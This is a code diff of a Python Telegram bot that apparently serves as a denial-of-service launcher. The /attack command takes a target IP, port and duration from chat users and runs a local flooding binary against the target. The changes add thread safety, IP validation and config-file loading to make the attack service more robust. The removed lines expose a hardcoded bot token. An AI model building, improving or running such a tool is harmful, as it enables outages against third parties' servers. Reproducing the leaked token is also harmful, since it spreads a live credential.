@@ -1,11 +1,22 @@
 import os
+import json
 import telebot
 import logging
 import time
 import asyncio
+import threading
+import ipaddress
 
-# Bot Token
-TOKEN = '5299697243:AAHL3WvNyXjgrzuT7FE0-2YQO5-uTiXWWmM'  # Replace with your bot token @hackerpro728_bot
+# Load Bot Token from Configuration File
+try:
+    with open('config.json', 'r') as config_file:
+        config = json.load(config_file)
+        TOKEN = config.get('TOKEN')
+        if not TOKEN:
+            raise ValueError("Bot token not found in config.json.")
+except (FileNotFoundError, json.JSONDecodeError):
+    raise ValueError("Error loading config.json. Make sure the file exists and is valid.")
+
 bot = telebot.TeleBot(TOKEN)
 
 # Logging Configuration
@@ -18,12 +29,13 @@ REQUEST_INTERVAL = 1
 bot.attack_in_progress = False
 bot.attack_duration = 0  # Duration of the ongoing attack
 bot.attack_start_time = 0  # Start time of the ongoing attack
+lock = threading.Lock()  # For thread safety
 
 # Blocked Ports
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
 # Async Loop
-loop = asyncio.get_event_loop()
+loop = asyncio.new_event_loop()
 
 
 async def start_asyncio_loop():
@@ -32,20 +44,26 @@ async def start_asyncio_loop():
 
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 200")
-    await process.communicate()
-    bot.attack_in_progress = False
+    try:
+        process = await asyncio.create_subprocess_shell(f"./hkr {target_ip} {target_port} {duration} 200")
+        await process.communicate()
+    except Exception as e:
+        logging.error(f"Error during attack execution: {e}")
+    finally:
+        with lock:
+            bot.attack_in_progress = False
 
 
 @bot.message_handler(commands=['attack'])
 def handle_attack_command(message):
     chat_id = message.chat.id
 
-    if bot.attack_in_progress:
-        bot.send_message(chat_id, "*⚠️ Please wait!*\n"
-                                   "*The bot is busy with another attack.*\n"
-                                   "*Check remaining time with the /when command.*", parse_mode='Markdown')
-        return
+    with lock:
+        if bot.attack_in_progress:
+            bot.send_message(chat_id, "*⚠️ Please wait!*\n"
+                                       "*The bot is busy with another attack.*\n"
+                                       "*Check remaining time with the /when command.*", parse_mode='Markdown')
+            return
 
     bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                                "*Please provide the target IP, port, and duration in seconds.*\n"
@@ -61,7 +79,14 @@ def process_attack_command(message):
                                                "*Please use the correct format: IP PORT DURATION.*", parse_mode='Markdown')
             return
 
-        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
+        target_ip = args[0]
+        try:
+            ipaddress.ip_address(target_ip)
+        except ValueError:
+            bot.send_message(message.chat.id, "*❌ Invalid IP address. Please try again.*", parse_mode='Markdown')
+            return
+
+        target_port, duration = int(args[1]), int(args[2])
 
         if target_port in blocked_ports:
             bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"
@@ -72,9 +97,10 @@ def process_attack_command(message):
                                                "*Please shorten the duration.*", parse_mode='Markdown')
             return
 
-        bot.attack_in_progress = True
-        bot.attack_duration = duration
-        bot.attack_start_time = time.time()
+        with lock:
+            bot.attack_in_progress = True
+            bot.attack_duration = duration
+            bot.attack_start_time = time.time()
 
         asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
         bot.send_message(message.chat.id, f"*🚀 Attack Launched!*\n\n"
@@ -89,16 +115,17 @@ def process_attack_command(message):
 @bot.message_handler(commands=['when'])
 def when_command(message):
     chat_id = message.chat.id
-    if bot.attack_in_progress:
-        elapsed_time = time.time() - bot.attack_start_time
-        remaining_time = bot.attack_duration - elapsed_time
+    with lock:
+        if bot.attack_in_progress:
+            elapsed_time = time.time() - bot.attack_start_time
+            remaining_time = bot.attack_duration - elapsed_time
 
-        if remaining_time > 0:
-            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*", parse_mode='Markdown')
+            if remaining_time > 0:
+                bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*", parse_mode='Markdown')
+            else:
+                bot.send_message(chat_id, "*🎉 The attack has successfully completed!*", parse_mode='Markdown')
         else:
-            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*", parse_mode='Markdown')
-    else:
-        bot.send_message(chat_id, "*❌ No attack is currently in progress!*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*❌ No attack is currently in progress!*", parse_mode='Markdown')
 
 
 @bot.message_handler(commands=['start'])
@@ -118,4 +145,8 @@ def start_asyncio_thread():
 
 # Start the bot
 if __name__ == "__main__":
-    bot.polling(none_stop=True)
+    threading.Thread(target=start_asyncio_thread, daemon=True).start()
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        logging.error(f"Error starting the bot: {e}")
